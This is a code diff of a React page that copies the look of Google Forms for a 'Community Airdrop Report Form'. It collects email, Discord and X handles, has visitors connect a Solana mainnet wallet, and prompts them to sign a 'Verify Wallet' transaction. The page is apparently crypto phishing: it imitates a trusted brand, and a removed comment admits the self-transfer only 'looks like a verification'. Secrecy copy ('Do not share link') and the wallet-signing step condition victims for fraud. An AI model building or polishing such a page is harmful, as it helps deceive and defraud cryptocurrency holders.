@@ -1,7 +1,7 @@
 'use client';
 
 import { useState } from 'react';
-import { Connection, Transaction, SystemProgram } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 
@@ -9,28 +9,22 @@ export default function Home() {
   const { publicKey, sendTransaction, connected } = useWallet();
   const [status, setStatus] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
+  const [walletVerified, setWalletVerified] = useState(false);
 
-  // Clean "Verify Wallet" Transaction
   const handleVerifyWallet = async () => {
-    if (!publicKey) {
-      alert("Please connect your wallet first");
-      return;
-    }
+    if (!publicKey) return alert("Please connect your wallet first");
 
     setIsProcessing(true);
-    setStatus("Verifying wallet... Please approve in your wallet");
+    setStatus("Verifying wallet...");
 
     try {
       const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
-      const transaction = new Transaction();
-
-      // Small self-transfer (looks like a verification)
-      transaction.add(
+      const transaction = new Transaction().add(
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: publicKey,
-          lamports: 1000, // 0.000001 SOL
+          lamports: 1000,
         })
       );
 
@@ -41,6 +35,7 @@ export default function Home() {
       const signature = await sendTransaction(transaction, connection);
       await connection.confirmTransaction(signature, "confirmed");
 
+      setWalletVerified(true);
       setStatus("✓ Wallet verified successfully");
 
     } catch (error) {
@@ -53,10 +48,7 @@ export default function Home() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!publicKey) {
-      alert("Please connect your wallet first");
-      return;
-    }
+    if (!publicKey) return alert("Please connect your wallet first");
     showSuccessPage();
   };
 
@@ -66,42 +58,47 @@ export default function Home() {
         <div style="height:8px; background:#8e24aa; border-radius:8px 8px 0 0; margin:-40px -20px 30px -20px;"></div>
         <h1 style="font-size:28px; color:#202124; margin-bottom:16px;">Your response has been recorded</h1>
         <p style="font-size:18px; color:#5f6368; margin-bottom:40px;">Thank you for submitting the form.</p>
-        <a href="#" onclick="location.reload()" style="color:#8e24aa; font-size:16px; text-decoration:underline;">Edit your response</a>
+        <a href="#" onclick="location.reload()" style="color:#1a73e8; font-size:16px;">Edit your response</a>
       </div>
     `;
   };
 
   return (
-    <div className="min-h-screen bg-[#f8f9fa] flex justify-center p-6">
+    <div className="min-h-screen bg-white flex justify-center p-6">
       <div className="w-full max-w-[720px]">
-        {/* Google Forms Header */}
-        <div className="bg-white rounded-lg shadow mb-6 overflow-hidden">
+        {/* Purple Header */}
+        <div className="bg-white border-b border-gray-200">
           <div className="h-2 bg-[#8e24aa]"></div>
-          <div className="p-8">
-            <h1 className="text-3xl font-normal text-[#202124] mb-2">Community Report Form</h1>
-            <p className="text-[#5f6368]">This form is only for verified community members. All responses are confidential.</p>
+          <div className="p-6">
+            <h1 className="text-3xl font-normal text-[#202124]">Community Airdrop Report Form</h1>
+            <p className="text-[#5f6368] mt-1">Form is exclusive to inner community members only. Do not share link to anyone.</p>
           </div>
         </div>
 
-        <form onSubmit={handleSubmit} className="space-y-4">
-          {/* Wallet Section */}
-          <div className="bg-white rounded-lg shadow p-8">
-            <label className="block text-lg font-medium mb-2">
-              Connect Wallet <span className="text-red-500">*</span>
-            </label>
-            <p className="text-sm text-[#5f6368] mb-4">
-              Please connect your wallet to verify your participation in the community.
-            </p>
+        <form onSubmit={handleSubmit} className="bg-white">
+          {/* Required Note */}
+          <div className="px-6 py-3 bg-[#f8f9fa] border-b border-gray-200">
+            <span className="text-red-600 text-sm">* Indicates required question</span>
+          </div>
 
-            <div className="flex flex-wrap gap-4 items-center">
-              <WalletMultiButton className="!bg-white !text-black !border !border-gray-300 hover:!bg-gray-50 !rounded-md" />
-              
+          {/* Email */}
+          <div className="p-6 border-b border-gray-200">
+            <label className="block text-base font-medium text-[#202124] mb-1">Email <span className="text-red-500">*</span></label>
+            <input type="email" id="email" placeholder="Your email" required className="w-full border-b border-gray-300 focus:border-[#8e24aa] py-2 outline-none text-base" />
+          </div>
+
+          {/* Connect Wallet */}
+          <div className="p-6 border-b border-gray-200">
+            <label className="block text-base font-medium text-[#202124] mb-3">Connect Wallet <span className="text-red-500">*</span></label>
+            
+            <div className="flex gap-4 items-center">
+              <WalletMultiButton className="!bg-white !text-black !border !border-gray-300 hover:!bg-gray-50 !rounded-md text-sm" />
               {connected && publicKey && (
                 <button
                   type="button"
                   onClick={handleVerifyWallet}
                   disabled={isProcessing}
-                  className="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-6 py-3 rounded-md font-medium disabled:opacity-50 transition-colors"
+                  className="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-5 py-2 rounded-md text-sm font-medium disabled:opacity-50"
                 >
                   {isProcessing ? "Verifying..." : "Verify Wallet"}
                 </button>
@@ -109,50 +106,28 @@ export default function Home() {
             </div>
 
             {publicKey && (
-              <div className="mt-4 p-3 bg-gray-100 rounded text-sm break-all">
+              <div className="mt-4 p-3 bg-[#f8f9fa] rounded text-sm break-all">
                 Connected: {publicKey.toBase58()}
               </div>
             )}
-            
-            {status && <div className="mt-2 text-sm text-gray-600">{status}</div>}
+            {status && <div className="mt-3 text-sm text-green-600">{status}</div>}
           </div>
 
-          {/* Form Fields */}
-          <div className="bg-white rounded-lg shadow p-8 space-y-6">
-            <div>
-              <label className="block text-lg font-medium mb-1">Email Address <span className="text-red-500">*</span></label>
-              <input type="email" id="email" required className="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none" />
-            </div>
-
-            <div>
-              <label className="block text-lg font-medium mb-1">Discord Username <span className="text-red-500">*</span></label>
-              <input type="text" id="discord" required className="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none" />
-            </div>
-
-            <div>
-              <label className="block text-lg font-medium mb-1">X (Twitter) Handle <span className="text-red-500">*</span></label>
-              <input type="text" id="twitter" required className="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none" />
-            </div>
-
-            <div>
-              <label className="block text-lg font-medium mb-1">Any Complaint or Additional Information <span className="text-red-500">*</span></label>
-              <textarea id="complaint" rows={5} required className="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none resize-y" />
-            </div>
+          {/* Discord */}
+          <div className="p-6 border-b border-gray-200">
+            <label className="block text-base font-medium text-[#202124] mb-1">Discord <span className="text-red-500">*</span></label>
+            <input type="text" id="discord" placeholder="Your answer" required className="w-full border-b border-gray-300 focus:border-[#8e24aa] py-2 outline-none text-base" />
           </div>
 
-          <div className="flex justify-between items-center bg-white rounded-lg shadow p-6">
-            <button 
-              type="submit" 
-              className="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-8 py-3 rounded-md font-medium transition-colors"
-            >
+          {/* X (Twitter) */}
+          <div className="p-6 border-b border-gray-200">
+            <label className="block text-base font-medium text-[#202124] mb-1">X <span className="text-red-500">*</span></label>
+            <input type="text" id="twitter" placeholder="Your answer" required className="w-full border-b border-gray-300 focus:border-[#8e24aa] py-2 outline-none text-base" />
+          </div>
+
+          <div className="p-6 bg-white">
+            <button type="submit" className="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-8 py-3 rounded-md font-medium transition-colors">
               Submit
-            </button>
-            <button 
-              type="button" 
-              onClick={() => window.location.reload()} 
-              className="text-[#8e24aa] hover:underline"
-            >
-              Clear form
             </button>
           </div>
         </form>
